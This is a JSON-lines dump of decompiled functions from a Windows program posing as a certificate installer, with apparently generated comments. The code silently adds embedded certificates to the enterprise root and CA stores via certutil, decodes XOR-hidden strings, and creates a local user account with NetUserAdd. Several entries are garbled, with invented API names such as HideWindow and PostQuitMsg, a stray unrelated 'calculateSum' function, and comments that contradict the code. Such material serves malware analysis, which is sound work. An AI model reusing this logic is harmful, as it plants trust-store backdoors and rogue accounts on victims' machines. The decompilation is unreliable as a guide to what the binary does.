{"Function Name": "FUN_140002630", "Address": "140002630", "Source Code": "\n// Function to copy exception information to a given memory location\nundefined8 *FUN_140002630(undefined8 *exception_info, longlong info_address)\n{\n    // Set the vftable of std::exception to the first element of param_1\n    *exception_info = std::exception::vftable;\n    // Set the second element of param_1 to 0\n    exception_info[1] = 0;\n    // Set the third element of param_1 to 0\n    exception_info[2] = 0;\n    // Copy exception information from (param_2 + 8) to param_1 + 1\n    __std_exception_copy((longlong *)(info_address + 8), exception_info + 1);\n    // Set the vftable of std::_System_error to the first element of param_1\n    *exception_info = std::_System_error::vftable;\n    // Set the fourth element of param_1 to the value at (param_2 + 0x18)\n    exception_info[3] = *(undefined8 *)(info_address + 0x18);\n    // Set the fifth element of param_1 to the value at (param_2 + 0x20)\n    exception_info[4] = *(undefined8 *)(info_address + 0x20);\n    // Return the modified param_1\n    return exception_info;\n}\n"}
{"Function Name": "FUN_140002680", "Address": "140002680", "Source Code": "\n// Function definition for FUN_140002680\nundefined8 *FUN_140002680(undefined8 *new_param, longlong new_value)\n{\n    // Set the first element of param_1 to the vftable of std::runtime_error\n    *new_param = std::runtime_error::vftable;\n    \n    // Set the second element of param_1 to 0\n    new_param[1] = 0;\n    \n    // Set the third element of param_1 to 0\n    new_param[2] = 0;\n    \n    // Copy the contents from (param_2 + 8) to param_1 + 1\n    __std_exception_copy((longlong *)(new_value + 8), new_param + 1);\n    \n    // Return param_1\n    return new_param;\n}\n"}
{"Function Name": "std::ios_base::`scalar_deleting_destructor'", "Address": "1400026c0", "Source Code": "\\*\n// Set the virtual function table pointer to the base class vftable\n*(undefined ***)object_ptr = vftable;\n\n// Call the base class destructor\n_Ios_base_dtor(object_ptr);\n\n// Check if the least significant bit of param_1 is set, then call thunk_FUN_14000b460\nif ((flag & 1) != 0) {\n    thunk_FUN_14000b460();\n}\n\n// Return the pointer to the object\nreturn object_ptr;\n*\\ \n \nvoid * __thiscall std::ios_base::_scalar_deleting_destructor_(ios_base *object_ptr, uint flag)\n{\n    *(undefined ***)object_ptr = vftable;\n    _Ios_base_dtor(object_ptr);\n    if ((flag & 1) != 0) {\n        thunk_FUN_14000b460();\n    }\n    return object_ptr;\n}"}
{"Function Name": "FUN_140002710", "Address": "140002710", "Source Code": "\nlonglong FUN_140002710(longlong input_param)\n{\n    // Update the value at offset 0x18 by clearing specific bits and setting a new bit\n    *(uint *)(input_param + 0x18) = (*(uint *)(input_param + 0x18) & 0xfffff9ff) | 0x800;\n    \n    // Return the modified parameter\n    return input_param;\n}\n"}
{"Function Name": "FUN_140002730", "Address": "140002730", "Source Code": "\n// Function to initialize the progress bar window\nvoid FUN_140002730(HINSTANCE param_1, undefined8 param_2, undefined8 param_3, int param_4)\n{\n    HWND parentWindowHandle; // Parent window handle\n    HWND progressBarWindowHandle; // Progress bar window handle\n    WNDCLASSEXW windowClassStructure; // Window class structure\n    INITCOMMONCONTROLSEX commonControlsStructure; // Common controls structure\n    tagMSG messageStructure; // Message structure\n    ulonglong localVariable; // Local variable\n    \n    // XOR operation\n    localVariable = DAT_140038080 ^ (ulonglong)auStackY_f8;\n    \n    // Initialize common controls\n    commonControlsStructure.dwSize = 8;\n    commonControlsStructure.dwICC = 0x20;\n    DAT_14003aa00 = param_1; // Set global variable\n    DAT_14003aa08 = param_4; // Set global variable\n    InitCommonControlsEx(&commonControlsStructure); // Initialize common controls\n    \n    // Set up window class attributes\n    windowClassStructure.lpszClassName = L\"CertInstallerProgressBar\";\n    windowClassStructure.cbClsExtra = 0;\n    windowClassStructure.cbWndExtra = 0;\n    windowClassStructure.lpszMenuName = (LPCWSTR)0x0;\n    windowClassStructure.hIconSm = (HICON)0x0;\n    windowClassStructure.cbSize = 0x50;\n    windowClassStructure.style = 3;\n    windowClassStructure.hbrBackground = (HBRUSH)0x6;\n    windowClassStructure.hCursor = LoadCursorW(DAT_14003aa00, (LPCWSTR)0x7f00);\n    windowClassStructure.lpfnWndProc = FUN_1400029b0;\n    windowClassStructure.hInstance = DAT_14003aa00;\n    windowClassStructure.hIcon = (HICON)LoadImageW(DAT_14003aa00, (LPCWSTR)0x68, 1, 0x20, 0x20, 0);\n    RegisterClassExW(&windowClassStructure); // Register window class\n    \n    // Get system metrics\n    int systemMetric1 = GetSystemMetrics(0);\n    int systemMetric2 = GetSystemMetrics(1);\n    \n    // Create parent window\n    parentWindowHandle = CreateWindowExW(0, L\"CertInstallerProgressBar\", L\"Certificate Installation\", 0xcf0000,\n        systemMetric1 / 2 + -0xff, systemMetric2 / 2 + -0x37, 0x1d6, 0x6e, (HWND)0x0, (HMENU)0x0, DAT_14003aa00, (LPVOID)0x0);\n    \n    // Create progress bar window\n    progressBarWindowHandle = CreateWindowExW(0, L\"msctls_progress32\", L\"\", 0x50000008, 0x14, 0x14, 0x19a, 0x1e, parentWindowHandle,\n        (HMENU)0x0, DAT_14003aa00, (LPVOID)0x0);\n    \n    // Set progress bar style\n    SendMessageW(progressBarWindowHandle, 0x40a, 1, 0);\n    \n    // Show parent window\n    ShowWindow(parentWindowHandle, DAT_14003aa08);\n    UpdateWindow(parentWindowHandle);\n    \n    // Create thread for progress bar\n    CreateThread((LPSECURITY_ATTRIBUTES)0x0, 0, FUN_1400029e0, parentWindowHandle, 0, (LPDWORD)0x0);\n    \n    int messageLoopVar;\n    // Message loop\n    while (messageLoopVar = GetMessageW(&messageStructure, (HWND)0x0, 0, 0), 0 < messageLoopVar) {\n        DispatchMessageW(&messageStructure);\n    }\n    \n    // Security check\n    __security_check_cookie(localVariable ^ (ulonglong)auStackY_f8);\n    return;\n}\n"}
{"Function Name": "FUN_1400029b0", "Address": "1400029b0", "Source Code": "\n// Function definition for FUN_1400029b0\nundefined8 FUN_1400029b0(HWND window_handle, int check_value)\n{\n    // Check if param_2 is not equal to 2\n    if (check_value != 2) {\n        // Call DefWindowProcW and return its result\n        return CallDefWindowProcW();\n    }\n    \n    // Hide the window associated with param_1\n    HideWindow(window_handle, 0);\n    // Post a quit message to the current thread's message queue\n    PostQuitMsg(0);\n    \n    // Return 0\n    return 0;\n}\n"}
{"Function Name": "FUN_1400029e0", "Address": "1400029e0", "Source Code": "\\*\n// Function to delay execution for 3000 milliseconds\nSleep(3000);\n\n// Call function with result of FUN_140002d20(&DAT_140031900, 0x51b, 0) as argument\nFUN_140002aa0(FUN_140002d20(&DAT_140031900, 0x51b, 0) ? 0xd : 1);\n\n// Call function with result of FUN_140002d20(&DAT_140031eb0, 0x558, 1) as argument\nFUN_140002aa0(FUN_140002d20(&DAT_140031eb0, 0x558, 1) ? 0xe : 2);\n\n// Call function to perform some operation\nFUN_140002fe0();\n\n// Call function to perform some operation\nFUN_140004150();\n\n// Call function to perform some operation\nFUN_140005d80();\n\n// Call function to perform some operation\nFUN_140006a30();\n\n// Send message to the specified window\nSendMessageW(window_handle, 2, 0, 0);\n\n// Return 1\nreturn 1;\n*\\ \n \nundefined8 delay_and_call_functions(HWND window_handle)\n{\n    Sleep(3000);\n    FUN_140002aa0(FUN_140002d20(&DAT_140031900, 0x51b, 0) ? 0xd : 1);\n    FUN_140002aa0(FUN_140002d20(&DAT_140031eb0, 0x558, 1) ? 0xe : 2);\n    FUN_140002fe0();\n    FUN_140004150();\n    FUN_140005d80();\n    FUN_140006a30();\n    SendMessageW(window_handle, 2, 0, 0);\n    return 1;\n}"}
{"Function Name": "FUN_140002aa0", "Address": "140002aa0", "Source Code": "\n// Function definition with parameter param_1\nvoid FUN_140002aa0(undefined4 new_param)\n{\n    undefined4 new_local_var; // Declare local variable local_18\n\n    new_local_var = new_param; // Assign param_1 to local variable local_18\n\n    // Loop until the address of local_18 is not equal to the address of local_14\n    do {\n        // Check if two global variables are equal\n        if (new_global_var_1 == new_global_var_2) {\n            // Call function with parameters\n            FUN_140009390(&new_global_var_3, (longlong)new_global_var_2, (undefined1 *)&new_local_var);\n        } else {\n            // Copy value from local_18 to global variable\n            *new_global_var_2 = *(undefined1 *)&new_local_var;\n            // Increment global variable address\n            new_global_var_2 = new_global_var_2 + 1;\n        }\n\n        new_local_var = 0; // Reset local variable local_18\n\n    } while (&new_local_var != &local_14); // End of loop condition\n\n    // Perform security check\n    __security_check_cookie(DAT_140038080 ^ (ulonglong)new_stack_var);\n\n    return; // Return from function\n}\n"}
{"Function Name": "FUN_140002b60", "Address": "140002b60", "Source Code": "\n// Function definition for FUN_140002b60\nvoid FUN_140002b60(int param_1, undefined4 param_2)\n{\n    code *function_pointer; // Pointer to a function\n    int *int_pointer; // Pointer to an integer\n    undefined1 undefined_bytes_array[32]; // Array of undefined bytes\n    ulonglong unsigned_long_long_var; // Unsigned long long variable\n\n    // XOR operation between two variables\n    unsigned_long_long_var = DAT_140038080 ^ (ulonglong)undefined_bytes_array;\n\n    // Function call to FUN_140008db0 with parameters\n    FUN_140008db0((longlong *)&local_var_1, 8);\n\n    // Assigning values to local variables\n    *local_var_1 = 4;\n    local_var_1[1] = param_2;\n    local_var_2 = param_1;\n    int_pointer = &local_var_2;\n\n    // Loop to process data\n    do {\n        if (data_1 == data_2) {\n            FUN_140009390(&data_3, (longlong)data_2, (undefined1 *)int_pointer);\n        } else {\n            *data_2 = (char)*int_pointer;\n            data_2 = data_2 + 1;\n        }\n        int_pointer = (int *)((longlong)int_pointer + 1);\n    } while (int_pointer != &local_var_3);\n\n    // More data processing loop\n    local_var_2 = (int)stack_pointer - (int)local_var_1;\n    int_pointer = &local_var_2;\n    do {\n        if (data_1 == data_2) {\n            FUN_140009390(&data_3, (longlong)data_2, (undefined1 *)int_pointer);\n        } else {\n            *data_2 = (char)*int_pointer;\n            data_2 = data_2 + 1;\n        }\n        int_pointer = (int *)((longlong)int_pointer + 1);\n    } while (int_pointer != &local_var_3);\n\n    // Loop to process more data\n    for (; local_var_1 != stack_pointer; local_var_1 = (undefined4 *)((longlong)local_var_1 + 1)) {\n        if (data_1 == data_2) {\n            FUN_140009390(&data_3, (longlong)data_2, (undefined1 *)local_var_1);\n        } else {\n            *data_2 = *(undefined1 *)local_var_1;\n            data_2 = data_2 + 1;\n        }\n    }\n\n    // Conditional check and function calls\n    if ((0xfff < (ulonglong)(local_var_4 - (longlong)local_var_1)) &&\n        (0x1f < (ulonglong)((longlong)local_var_1 + (-8 - *(longlong *)(local_var_1 + -2))))){\n        FUN_14000ed18();\n        function_pointer = (code *)swi(3);\n        (*function_pointer)();\n        return;\n    }\n\n    // Function call and return\n    thunk_FUN_14000b460();\n    __security_check_cookie(unsigned_long_long_var ^ (ulonglong)undefined_bytes_array);\n    return;\n}\n"}
{"Function Name": "FUN_140002d00", "Address": "140002d00", "Source Code": "\n// Function definition for FUN_140002d00\nvoid new_function(int input_param)\n{\n    // Call function FUN_140002b60 with param_1 and GetLastError() as arguments\n    another_function(input_param, retrieve_error());\n}\n"}
{"Function Name": "FUN_140002d20", "Address": "140002d20", "Source Code": "\n// Function to perform a series of operations with temporary files and processes\nvoid FUN_140002d20(LPCVOID param_1, DWORD param_2, int param_3)\n{\n    DWORD return_value_1; // Variable to store return values\n    UINT return_value_2; // Variable to store return values\n    BOOL boolean_result; // Variable to store boolean results\n    HANDLE file_handle; // File handle\n    wchar_t *destination_str; // Destination string\n    wchar_t *source_str; // Source string\n    _PROCESS_INFORMATION process_info_struct; // Process information structure\n    _STARTUPINFOW startup_info_struct; // Startup information structure\n    WCHAR temp_path_array[248]; // Array to store temporary path\n    WCHAR temp_file_path_array[264]; // Array to store temporary file path\n    \n    // Get temporary path\n    return_value_1 = GetTempPathW(0xf6, temp_path_array);\n    if (return_value_1 == 0) {\n        // Get temporary file name\n        return_value_2 = GetTempFileNameW(L\".\", L\"crt\", 0, temp_file_path_array);\n        if (return_value_2 == 0) {\n            return_value_1 = GetLastError();\n            FUN_140002b60(10, return_value_1); // Error handling function\n            FUN_140002fbf(); // Function call\n            return;\n        }\n    } else {\n        return_value_2 = GetTempFileNameW(temp_path_array, L\"crt\", 0, temp_file_path_array);\n        if (return_value_2 == 0) {\n            goto LAB_140002d82;\n        }\n    }\n    \n    // Create file for writing\n    file_handle = CreateFileW(temp_file_path_array, 0x10000000, 0, (LPSECURITY_ATTRIBUTES)0x0, 2, 0x80, (HANDLE)0x0);\n    boolean_result = WriteFile(file_handle, param_1, param_2, NULL, (LPOVERLAPPED)0x0); // Write data to file\n    if (boolean_result == 0) {\n        return_value_1 = GetLastError();\n        FUN_140002b60(3, return_value_1); // Error handling function\n        CloseHandle(file_handle); // Close file handle\n        goto LAB_140002faf;\n    }\n    \n    CloseHandle(file_handle); // Close file handle\n    destination_str = (wchar_t *)operator_new(0x200); // Allocate memory for destination string\n    *destination_str = L'\\0'; // Initialize destination string\n    wcscat_s(destination_str, 0x100, L\"certutil.exe -f -Enterprise -addstore \"); // Concatenate strings\n    \n    if (param_3 == 0) {\n        source_str = L\"root\";\n    } else if (param_3 == 1) {\n        source_str = L\"ca\";\n    }\n    \n    wcscat_s(destination_str, 0x100, source_str); // Concatenate strings\n    wcscat_s(destination_str, 0x100, L\" \\\"\"); // Concatenate strings\n    wcscat_s(destination_str, 0x100, temp_file_path_array); // Concatenate strings\n    wcscat_s(destination_str, 0x100, L\"\\\"\"); // Concatenate strings\n    \n    // Initialize startup information structure\n    startup_info_struct.cb = 0x68;\n    startup_info_struct.hStdError._4_4_ = 0;\n    process_info_struct.dwProcessId = 0;\n    process_info_struct.dwThreadId = 0;\n    startup_info_struct._4_8_ = 0;\n    startup_info_struct._12_8_ = 0;\n    startup_info_struct._20_8_ = 0;\n    startup_info_struct._28_8_ = 0;\n    startup_info_struct.dwY = 0;\n    startup_info_struct.dwXSize = 0;\n    startup_info_struct.dwYSize = 0;\n    startup_info_struct.dwXCountChars = 0;\n    startup_info_struct.dwYCountChars = 0;\n    startup_info_struct.dwFillAttribute = 0;\n    startup_info_struct.dwFlags = 0;\n    startup_info_struct.wShowWindow = 0;\n    startup_info_struct.cbReserved2 = 0;\n    startup_info_struct._68_8_ = 0;\n    startup_info_struct._76_8_ = 0;\n    startup_info_struct._84_8_ = 0;\n    startup_info_struct._92_8_ = 0;\n    process_info_struct.hProcess = (HANDLE)0x0;\n    process_info_struct.hThread = (HANDLE)0x0;\n    \n    // Create process\n    boolean_result = CreateProcessW((LPCWSTR)0x0, destination_str, (LPSECURITY_ATTRIBUTES)0x0, (LPSECURITY_ATTRIBUTES)0x0, 0,\n                           0x8000000, (LPVOID)0x0, (LPCWSTR)0x0, &startup_info_struct, &process_info_struct);\n    \n    if (boolean_result == 0) {\n        return_value_1 = GetLastError();\n        FUN_140002b60(0xc, return_value_1); // Error handling function\n    } else {\n        WaitForSingleObject(process_info_struct.hProcess, 20000); // Wait for process to finish\n        CloseHandle(process_info_struct.hThread); // Close thread handle\n        CloseHandle(process_info_struct.hProcess); // Close process handle\n    }\n    \n    thunk_FUN_14000b460(); // Function call\n    DeleteFileW(temp_file_path_array); // Delete temporary file\n    \nLAB_140002faf:\n    return;\n}\n"}
{"Function Name": "FUN_140002dbe", "Address": "140002dbe", "Source Code": "\n// Function to calculate the sum of two integers\nint calculateSum(int num1, int num2) {\n    // Calculate the sum of the two integers\n    int sum = num1 + num2;\n    // Return the result\n    return sum;\n}\n"}
{"Function Name": "FUN_140002fbf", "Address": "140002fbf", "Source Code": "\nvoid performSecurityCheck(void)\n{\n    // Perform security check on the cookie\n    __security_check_cookie((ulonglong)&stack0x00000000);\n    \n    // Return from the function\n    return;\n}\n"}
{"Function Name": "FUN_140002fe0", "Address": "140002fe0", "Source Code": "\n// Function definition for FUN_140002fe0\nvoid FUN_140002fe0(void)\n{\n    // Local variables declaration\n    undefined1 new_auStack_78 [32];\n    undefined8 new_local_58 = 0xfffffffffffffffe;\n    WCHAR new_local_50;\n    undefined8 new_local_40;\n    ulonglong new_uStack_38;\n    longlong new_local_30 [3];\n    ulonglong new_local_18;\n    \n    // Initialize local variables\n    new_local_40 = _DAT_140032a20;\n    new_uStack_38 = _UNK_140032a28;\n    new_local_50 = L'\\0';\n    \n    // Calculate local_10 value\n    local_10 = DAT_140038080 ^ (ulonglong)new_auStack_78;\n    \n    // Call functions\n    FUN_1400030e0(new_local_30);\n    FUN_140003990(&new_local_50, new_local_30);\n    FUN_140003d40((undefined8 *)&new_local_50);\n    \n    // Check conditions and call functions based on the result\n    if (7 < new_uStack_38) {\n        if ((0xfff < new_uStack_38 * 2 + 2) && (0x1f < (CONCAT62(uStack_4e, new_local_50) - *(longlong *)(CONCAT62(uStack_4e, new_local_50) + -8)) - 8U)) {\n            FUN_14000ed18();\n            goto LAB_1400030cc;\n        }\n        thunk_FUN_14000b460();\n    }\n    \n    // Check conditions and call functions based on the result\n    if (7 < new_local_18) {\n        if ((0xfff < new_local_18 * 2 + 2) && (0x1f < (new_local_30[0] - *(longlong *)(new_local_30[0] + -8)) - 8U)) {\n            LAB_1400030cc:\n            FUN_14000ed18();\n            pcVar1 = (code *)swi(3);\n            (*pcVar1)();\n            return;\n        }\n        thunk_FUN_14000b460();\n    }\n    \n    // Perform security check\n    __security_check_cookie(local_10 ^ (ulonglong)new_auStack_78);\n    return;\n}\n"}
{"Function Name": "FUN_140003990", "Address": "140003990", "Source Code": "\n// Function definition for FUN_140003990\nLPCWSTR FUN_140003990(LPCWSTR input_str, undefined8 *output_ptr)\n{\n    code *temp_code;\n    DWORD file_attributes;\n    LPCWSTR file_path;\n\n    // XOR operation with constants\n    _DAT_14003ac30 = _DAT_14003ac30 ^ 0x55498a9a5733769f;\n    _DAT_14003ac38 = _DAT_14003ac38 ^ 0xe5e0294ba7b8b0d0;\n    _DAT_14003ac40 = _DAT_14003ac40 ^ 0x3f655b8c8e56c319;\n    _DAT_14003ac48 = _DAT_14003ac48 ^ 0x9906ab75af2144aa;\n\n    // Call to function FUN_1400081f0\n    FUN_1400081f0((longlong *)input_str, output_ptr, 0x14003ac30);\n\n    // XOR operation with constants\n    _DAT_14003ac30 = _DAT_14003ac30 ^ 0x55498a9a5733769f;\n    _DAT_14003ac38 = _DAT_14003ac38 ^ 0xe5e0294ba7b8b0d0;\n    _DAT_14003ac40 = _DAT_14003ac40 ^ 0x3f655b8c8e56c319;\n    _DAT_14003ac48 = _DAT_14003ac48 ^ 0x9906ab75af2144aa;\n\n    // Check if offset 0xc in param_1 is greater than 7\n    file_path = input_str;\n    if (7 < *(ulonglong *)(input_str + 0xc)) {\n        file_path = *(LPCWSTR *)input_str;\n    }\n\n    // Get file attributes of pWVar3\n    file_attributes = GetFileAttributesW(file_path);\n\n    // Check if GetFileAttributesW returned 0xffffffff\n    if (file_attributes == 0xffffffff) {\n        file_attributes = GetLastError();\n        if (1 < file_attributes - 2) {\n            // Call functions FUN_140001b60 and FUN_14000c234\n            FUN_140001b60(local_48, 0x1400315bf);\n            FUN_14000c234(local_48, &DAT_140036178);\n            temp_code = (code *)swi(3);\n            file_path = (LPCWSTR)(*temp_code)();\n            return file_path;\n        }\n        // Call function FUN_140003b50\n        FUN_140003b50(input_str);\n    }\n    else if ((file_attributes & 0x10) == 0) {\n        // Call functions FUN_140001b60 and FUN_14000c234\n        FUN_140001b60(local_30, 0x1400315bf);\n        FUN_14000c234(local_30, &DAT_140036178);\n        temp_code = (code *)swi(3);\n        file_path = (LPCWSTR)(*temp_code)();\n        return file_path;\n    }\n\n    // Return param_1\n    return input_str;\n}\n"}
{"Function Name": "FUN_140003b50", "Address": "140003b50", "Source Code": "\n// Function definition for FUN_140003b50\nvoid FUN_140003b50(LPCWSTR param_1)\n{\n    WCHAR new_WVar1; // Variable to store a single wide character\n    ulonglong new_uVar2; // Variable to store an unsigned long long value\n    ulonglong new_uVar3; // Variable to store an unsigned long long value\n    BOOL new_BVar5; // Variable to store a boolean value\n    DWORD new_DVar6; // Variable to store a DWORD value\n    longlong new_lVar7; // Variable to store a long long value\n    ulonglong new_uVar8; // Variable to store an unsigned long long value\n    LPCWSTR new_pWVar9; // Pointer to a constant wide string\n    LPCWSTR new_pWVar10; // Pointer to a constant wide string\n    WCHAR *new_pWVar11; // Pointer to a wide character\n    WCHAR *new_pWVar12; // Pointer to a wide character\n    ulonglong new_uVar13; // Variable to store an unsigned long long value\n    undefined1 new_auStack_78 [32]; // Array to store undefined values\n    undefined8 new_local_40; // Variable to store an unsigned long long value\n    WCHAR new_local_38; // Variable to store a single wide character\n    undefined6 new_uStack_36; // Variable to store an undefined value\n    undefined8 new_local_28; // Variable to store an unsigned long long value\n    ulonglong new_local_20; // Variable to store an unsigned long long value\n\n    // Initialize variables\n    new_local_40 = 0xfffffffffffffffe;\n    new_local_20 = DAT_140038080 ^ (ulonglong)new_auStack_78;\n    new_pWVar12 = (WCHAR *)0x0;\n    new_pWVar11 = new_pWVar12;\n\n    // Loop through the code logic\n    while (true) {\n        new_uVar8 = (ulonglong)(int)new_pWVar11;\n        new_uVar2 = *(ulonglong *)(param_1 + 8);\n        new_uVar3 = *(ulonglong *)(param_1 + 0xc);\n        new_pWVar10 = param_1;\n        if (7 < new_uVar3) {\n            new_pWVar10 = *(LPCWSTR *)param_1;\n        }\n        if (new_uVar2 <= new_uVar8) break;\n        new_lVar7 = new_uVar2 - new_uVar8;\n        new_pWVar9 = new_pWVar10 + new_uVar8;\n        new_pWVar11 = new_pWVar12;\n        if (new_lVar7 != 0) {\n            new_WVar1 = *new_pWVar9;\n            for (; (new_pWVar11 = new_pWVar9, new_WVar1 != L'\\\\' && (new_pWVar11 = new_pWVar12, new_lVar7 != 1));\n            new_lVar7 = new_lVar7 + -1) {\n                new_pWVar9 = new_pWVar9 + 1;\n                new_WVar1 = *new_pWVar9;\n            }\n        }\n        if ((new_pWVar11 == (WCHAR *)0x0) ||\n        (new_uVar8 = (longlong)new_pWVar11 - (longlong)new_pWVar10 >> 1, new_uVar8 == 0xffffffffffffffff)) break;\n        new_local_28 = 0;\n        new_local_20 = 7;\n        new_local_38 = L'\\0';\n        new_uVar13 = new_uVar8;\n        if (new_uVar2 < new_uVar8) {\n            new_uVar13 = new_uVar2;\n        }\n        new_pWVar10 = param_1;\n        if (7 < new_uVar3) {\n            new_pWVar10 = *(LPCWSTR *)param_1;\n        }\n        FUN_140007c50((longlong *)&new_local_38,(undefined8 *)new_pWVar10,new_uVar13);\n        new_pWVar11 = (WCHAR *)(ulonglong)((int)new_uVar8 + 1);\n        new_pWVar10 = &new_local_38;\n        if (7 < new_local_20) {\n            new_pWVar10 = (LPCWSTR)CONCAT62(new_uStack_36,new_local_38);\n        }\n        new_BVar5 = CreateDirectoryW(new_pWVar10,(LPSECURITY_ATTRIBUTES)0x0);\n        if ((new_BVar5 == 0) && (new_DVar6 = GetLastError(), new_DVar6 != 0xb7)) goto LAB_140003d04;\n        if (7 < new_local_20) {\n            if ((0xfff < new_local_20 * 2 + 2) &&\n            (0x1f < (CONCAT62(new_uStack_36,new_local_38) - *(longlong *)(CONCAT62(new_uStack_36,new_local_38) + -8)) -\n            8U)) goto LAB_140003d31;\n            thunk_FUN_14000b460();\n        }\n    }\n\n    // Check condition and create directory\n    if (7 < new_uVar3) {\n        param_1 = *(LPCWSTR *)param_1;\n    }\n    new_BVar5 = CreateDirectoryW(param_1,(LPSECURITY_ATTRIBUTES)0x0);\n    if ((new_BVar5 != 0) || (new_DVar6 = GetLastError(), new_DVar6 == 0xb7)) {\n        __security_check_cookie(new_local_20 ^ (ulonglong)new_auStack_78);\n        return;\n    }\n\n    // Call functions and return\n    FUN_140002d00(0x14);\n    FUN_140001b60(local_58,0x1400315bf);\n    FUN_14000c234(local_58,&DAT_140036178);\nLAB_140003d04:\n    FUN_140002d00(0x14);\n    FUN_140001b60(local_58,0x1400315bf);\n    FUN_14000c234(local_58,&DAT_140036178);\nLAB_140003d31:\n    FUN_14000ed18();\n    pcVar4 = (code *)swi(3);\n    (*pcVar4)();\n    return;\n}\n"}
{"Function Name": "FUN_140004150", "Address": "140004150", "Source Code": "\n// Function definition\nvoid FUN_140004150(void)\n{\n    // Variable declarations\n    DWORD new_DVar3;\n    undefined4 new_uVar4;\n    ulonglong new_uVar5;\n    ulonglong new_uVar6;\n    undefined1 new_auStack_d8 [32];\n    undefined8 new_local_b8;\n    undefined8 new_local_b0;\n    WCHAR *new_local_a8;\n    longlong *new_local_a0;\n    undefined4 new_local_98;\n    undefined4 new_local_94;\n    undefined8 new_local_90;\n    undefined8 new_uStack_88;\n    undefined4 new_local_80;\n    undefined4 new_local_7c;\n    undefined8 new_local_78;\n    undefined4 new_local_70 [2];\n    undefined2 new_local_68;\n    undefined6 new_uStack_66;\n    undefined8 new_local_58;\n    ulonglong new_uStack_50;\n    WCHAR new_local_48;\n    undefined6 new_uStack_46;\n    undefined8 new_local_38;\n    ulonglong new_uStack_30;\n    \n    // Initialization of variables\n    new_local_b0 = 0xfffffffffffffffe;\n    new_local_98 = 0;\n    new_local_7c = 0;\n    \n    // XOR operations\n    _DAT_14003abc0 = _DAT_14003abc0 ^ 0x55498a9a5733769f;\n    _DAT_14003abc8 = _DAT_14003abc8 ^ 0xe5e0294ba7b8b0d0;\n    _DAT_14003abd0 = _DAT_14003abd0 ^ 0x3f655b8c8e56c319;\n    _DAT_14003abd8 = _DAT_14003abd8 ^ 0x9906ab75af2144aa;\n    new_local_b8 = 0xe5e0294ba7b8b0d0;\n    _DAT_14003abe0 = _DAT_14003abe0 ^ 0x55498a9a5733769f;\n    _DAT_14003abe8 = _DAT_14003abe8 ^ 0xe5e0294ba7b8b0d0;\n    new_local_38 = _DAT_140032a20;\n    new_uStack_30 = _UNK_140032a28;\n    new_local_48 = L'\\0';\n    new_uVar5 = 0xffffffffffffffff;\n    new_uVar6 = 0xffffffffffffffff;\n    \n    // Loop to find string length\n    do {\n        new_uVar6 = new_uVar6 + 1;\n    } while ((&DAT_14003abc0)[new_uVar6] != 0);\n    \n    // Function call\n    FUN_140007c50((longlong *)&new_local_48,(undefined8 *)&DAT_14003abc0,new_uVar6);\n    \n    // Another loop to find string length\n    new_local_58 = _DAT_140032a20;\n    new_uStack_50 = _UNK_140032a28;\n    new_local_68 = 0;\n    do {\n        new_uVar5 = new_uVar5 + 1;\n    } while ((&DAT_14003abe0)[new_uVar5] != 0);\n    \n    // Another function call\n    FUN_140007c50((longlong *)&new_local_68,(undefined8 *)&DAT_14003abe0,new_uVar5);\n    \n    // XOR operations\n    _DAT_14003abe0 = _DAT_14003abe0 ^ 0x55498a9a5733769f;\n    _DAT_14003abe8 = _DAT_14003abe8 ^ 0xe5e0294ba7b8b0d0;\n    new_local_b8 = 0x9906ab75af2144aa;\n    _DAT_14003abc0 = _DAT_14003abc0 ^ 0x55498a9a5733769f;\n    _DAT_14003abc8 = _DAT_14003abc8 ^ 0xe5e0294ba7b8b0d0;\n    _DAT_14003abd0 = _DAT_14003abd0 ^ 0x3f655b8c8e56c319;\n    _DAT_14003abd8 = _DAT_14003abd8 ^ 0x9906ab75af2144aa;\n    \n    // Condition checks and variable assignments\n    new_local_a8 = &new_local_48;\n    if (7 < new_uStack_30) {\n        new_local_a8 = (WCHAR *)CONCAT62(new_uStack_46,new_local_48);\n    }\n    new_local_a0 = (longlong *)&new_local_68;\n    if (7 < new_uStack_50) {\n        new_local_a0 = (longlong *)CONCAT62(new_uStack_66,new_local_68);\n    }\n    new_local_94 = 1;\n    new_local_90 = 0;\n    new_uStack_88 = 0;\n    new_local_80 = 0x10041;\n    new_local_78 = 0;\n    new_local_70[0] = 0;\n    \n    // Function call and error handling\n    int iVar2 = NetUserAdd(0,1,&new_local_a8,new_local_70);\n    if (iVar2 == 0) {\n        new_uVar4 = 8;\n        FUN_140002aa0(new_uVar4);\n        iVar2 = FUN_140004460((undefined8 *)&new_local_48);\n        if (iVar2 == 0) {\n            FUN_140002aa0(0xf);\n        }\n        new_uVar5 = FUN_1400049c0(&new_local_48);\n        if ((int)new_uVar5 == 0) {\n            FUN_140002aa0(0x11);\n        }\n    }\n    else if (iVar2 == 0x57) {\n        FUN_140002b60(6,new_local_70[0]);\n    }\n    else {\n        if (iVar2 == 0x8b0) {\n            new_uVar4 = 5;\n            FUN_140002aa0(new_uVar4);\n        }\n        else {\n            new_DVar3 = GetLastError();\n            FUN_140002b60(7,new_DVar3);\n        }\n    }\n    \n    // Additional checks and function calls\n    if (7 < new_uStack_50) {\n        if ((0xfff < new_uStack_50 * 2 + 2) &&\n            (0x1f < (CONCAT62(new_uStack_66,new_local_68) - *(longlong *)(CONCAT62(new_uStack_66,new_local_68) + -8)) - 8U)) {\n            thunk_FUN_14000b460();\n        }\n    }\n    \n    // More checks and function calls\n    new_local_58 = _DAT_140032a20;\n    new_uStack_50 = _UNK_140032a28;\n    new_local_68 = 0;\n    if (7 < new_uStack_30) {\n        if ((0xfff < new_uStack_30 * 2 + 2) &&\n            (0x1f < (CONCAT62(new_uStack_46,new_local_48) - *(longlong *)(CONCAT62(new_uStack_46,new_local_48) + -8)) - 8U)) {\n            FUN_14000ed18();\n            goto LAB_140004457;\n        }\n        thunk_FUN_14000b460();\n    }\n    \n    // Security check\n    __security_check_cookie(local_28 ^ (ulonglong)new_auStack_d8);\n    \n    // Return statement\n    return;\n}\n"}
